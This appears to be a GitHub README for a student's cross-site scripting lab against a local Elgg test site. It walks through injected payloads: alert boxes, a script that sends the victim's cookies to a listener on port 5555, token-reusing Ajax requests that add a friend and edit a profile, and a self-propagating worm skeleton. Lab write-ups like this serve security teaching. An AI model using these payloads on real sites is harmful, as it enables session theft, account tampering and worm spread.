# cross-site-scripiting-xxs-lab-attack-
here is the detailed git repo of xxs lab attack 
# lab adress 
URL: http://www.xsslabelgg.com
Folder: /var/www/XSS/Elgg/

Task 1: Posting a Malicious Message to Display an Alert Window
# script <script>alert(’This is an attack’);</script>

link of image https://github.com/ghulammohiodin/cross-site-scripiting-xxs-lab-attack-/blob/3c913a3e6df71b8ea67afc9863394568a834c2e2/task%201%20alert.png

script for showing alert
<script type="text/javascript"
src="http://www.loalhost/myscripts.js">
</script>

link of image https://github.com/ghulammohiodin/cross-site-scripiting-xxs-lab-attack-/blob/3c913a3e6df71b8ea67afc9863394568a834c2e2/showing%20attack.png
https://github.com/ghulammohiodin/cross-site-scripiting-xxs-lab-attack-/blob/3c913a3e6df71b8ea67afc9863394568a834c2e2/script%20for%20showing%20alert.png


Task 2: Posting a Malicious Message to Display Cookies
script for showing cookies <script>alert(document.cookie);</script>

link of image https://github.com/ghulammohiodin/cross-site-scripiting-xxs-lab-attack-/blob/3c913a3e6df71b8ea67afc9863394568a834c2e2/script%20for%20cookies.png

 Task 3: Stealing Cookies from the Victim’s Machine
 #script for stealing cookies from victm mechine 
 <script>document.write(’<img src=http://127.0.0.1:5555?c=’
+ escape(document.cookie) + ’ >’);
</script>
 image for scripting of stealling cookies from victom
 https://github.com/ghulammohiodin/cross-site-scripiting-xxs-lab-attack-/blob/3c913a3e6df71b8ea67afc9863394568a834c2e2/script%20for%20stealing%20cookies.png
 
 Task 4: Becoming the Victim’s Friend
 
 
 image for becoming victoms friend 
 https://github.com/ghulammohiodin/cross-site-scripiting-xxs-lab-attack-/blob/3c913a3e6df71b8ea67afc9863394568a834c2e2/add%20friends%20to%20aice.png
 
 
 script for becoming victoms friend 
 <script type="text/javascript">
window.onload = function () {
var Ajax=null;
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
  var token="&__elgg_token="+elgg.security.token.__elgg_token; ➁
//Construct the HTTP request to add Samy as a friend.
var sendurl=...; //FILL IN
//Create and send Ajax request to add friend
Ajax=new XMLHttpRequest();
Ajax.open("GET",sendurl,true);
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
Ajax.send();
}
</script>

Task 5: Modifying the Victim’s Profile
#script for modifiying victoms profile 

<script type="text/javascript">
window.onload = function(){
//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
//and Security Token __elgg_token
var userName=elgg.session.user.name;
var guid="&guid="+elgg.session.user.guid;
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
var token="&__elgg_token="+elgg.security.token.__elgg_token;
//Construct the content of your url.
var content=...; //FILL IN
  var samyGuid=...; //FILL IN
if(elgg.session.user.guid!=samyGuid) ➀
{
//Create and send Ajax request to modify profile
var Ajax=null;
Ajax=new XMLHttpRequest();
Ajax.open("POST",sendurl,true);
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("Content-Type",
"application/x-www-form-urlencoded");
Ajax.send(content);
}
}
</script>

https://github.com/ghulammohiodin/cross-site-scripiting-xxs-lab-attack-/blob/3c913a3e6df71b8ea67afc9863394568a834c2e2/editing%20friends%20profile.png


Task 6: Writing a Self-Propagating XSS Worm

# link approach 
<script type="text/javascript" src="localhost.com/xss_worm.js">
</script>

# Dom approach
<script id=worm>
var headerTag = "<script id=\"worm\" type=\"text/javascript\">"; ➀
var jsCode = document.getElementById("worm").innerHTML; ➁
var tailTag = "</" + "script>"; ➂
var wormCode = encodeURIComponent(headerTag + jsCode + tailTag); ➃
alert(jsCode);
</script>

 
 
 
 
 





